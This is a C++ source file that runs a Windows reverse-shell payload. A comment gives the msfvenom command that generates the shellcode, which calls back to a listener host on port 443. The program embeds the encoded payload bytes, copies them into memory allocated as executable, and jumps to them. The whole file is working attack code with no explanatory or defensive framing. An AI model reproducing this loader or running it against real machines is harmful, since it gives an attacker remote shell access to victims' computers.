
/* Shellcode : msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip in listen> LPORT=443 -f c -b \x00\x0a\x0d 
*/

#include <iostream>
#include <windows.h>

int main()
{
    unsigned char shellcode[] = "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
                                "\xff\xff\x48\xbb\xd8\x06\xdb\xbe\x53\x6c\xfd\xab\x48\x31\x58"
                                "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x24\x4e\x58\x5a\xa3\x84"
                                "\x3d\xab\xd8\x06\x9a\xef\x12\x3c\xaf\xfa\x8e\x4e\xea\x6c\x36"
                                "\x24\x76\xf9\xb8\x4e\x50\xec\x4b\x24\x76\xf9\xf8\x4e\x50\xcc"
                                "\x03\x24\xf2\x1c\x92\x4c\x96\x8f\x9a\x24\xcc\x6b\x74\x3a\xba"
                                "\xc2\x51\x40\xdd\xea\x19\xcf\xd6\xff\x52\xad\x1f\x46\x8a\x47"
                                "\x8a\xf6\xd8\x3e\xdd\x20\x9a\x3a\x93\xbf\x83\xe7\x7d\x23\xd8"
                                "\x06\xdb\xf6\xd6\xac\x89\xcc\x90\x07\x0b\xee\xd8\x24\xe5\xef"
                                "\x53\x46\xfb\xf7\x52\xbc\x1e\xfd\x90\xf9\x12\xff\xd8\x58\x75"
                                "\xe3\xd9\xd0\x96\x8f\x9a\x24\xcc\x6b\x74\x47\x1a\x77\x5e\x2d"
                                "\xfc\x6a\xe0\xe6\xae\x4f\x1f\x6f\xb1\x8f\xd0\x43\xe2\x6f\x26"
                                "\xb4\xa5\xef\x53\x46\xff\xf7\x52\xbc\x9b\xea\x53\x0a\x93\xfa"
                                "\xd8\x2c\xe1\xe2\xd9\xd6\x9a\x35\x57\xe4\xb5\xaa\x08\x47\x83"
                                "\xff\x0b\x32\xa4\xf1\x99\x5e\x9a\xe7\x12\x36\xb5\x28\x34\x26"
                                "\x9a\xec\xac\x8c\xa5\xea\x81\x5c\x93\x35\x41\x85\xaa\x54\x27"
                                "\xf9\x86\xf7\xed\x1b\x8e\x99\x87\x35\xe9\xbe\x53\x2d\xab\xe2"
                                "\x51\xe0\x93\x3f\xbf\xcc\xfc\xab\xd8\x4f\x52\x5b\x1a\xd0\xff"
                                "\xab\xd9\xbd\x77\xa7\xba\x67\xbc\xff\x91\x8f\x3f\xf2\xda\x9d"
                                "\xbc\x11\x94\x71\xfd\xb9\xac\xb9\xb1\x22\x32\x6e\xda\xbf\x53"
                                "\x6c\xa4\xea\x62\x2f\x5b\xd5\x53\x93\x28\xfb\x88\x4b\xea\x77"
                                "\x1e\x5d\x3d\xe3\x27\xc6\x93\x37\x91\x24\x02\x6b\x90\x8f\x1a"
                                "\xff\xe9\x86\xf2\x74\x38\xf9\x0e\xf6\xda\xab\x97\xbb\x99\x5e"
                                "\x97\x37\xb1\x24\x74\x52\x99\xbc\x42\x1b\x27\x0d\x02\x7e\x90"
                                "\x87\x1f\xfe\x51\x6c\xfd\xe2\x60\x65\xb6\xda\x53\x6c\xfd\xab"
                                "\xd8\x47\x8b\xff\x03\x24\x74\x49\x8f\x51\x8c\xf3\x62\xac\x97"
                                "\xa6\x81\x47\x8b\x5c\xaf\x0a\x3a\xef\xfc\x52\xda\xbf\x1b\xe1"
                                "\xb9\x8f\xc0\xc0\xdb\xd6\x1b\xe5\x1b\xfd\x88\x47\x8b\xff\x03"
                                "\x2d\xad\xe2\x27\xc6\x9a\xee\x1a\x93\x35\xe6\x51\xc7\x97\x37"
                                "\x92\x2d\x47\xd2\x14\x39\x5d\x41\x86\x24\xcc\x79\x90\xf9\x11"
                                "\x35\x5d\x2d\x47\xa3\x5f\x1b\xbb\x41\x86\xd7\x0d\x1e\x7a\x50"
                                "\x9a\x04\xf5\xf9\x40\x36\x27\xd3\x93\x3d\x97\x44\xc1\xad\xa4"
                                "\x0c\x5b\x45\xb3\x19\xf8\x10\x9f\x15\xa9\xd1\x39\x6c\xa4\xea"
                                "\x51\xdc\x24\x6b\x53\x6c\xfd\xab";

    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (exec != NULL) {
        memcpy(exec, shellcode, sizeof shellcode);
        ((void(*)())exec) ();
    }

    return 0;
}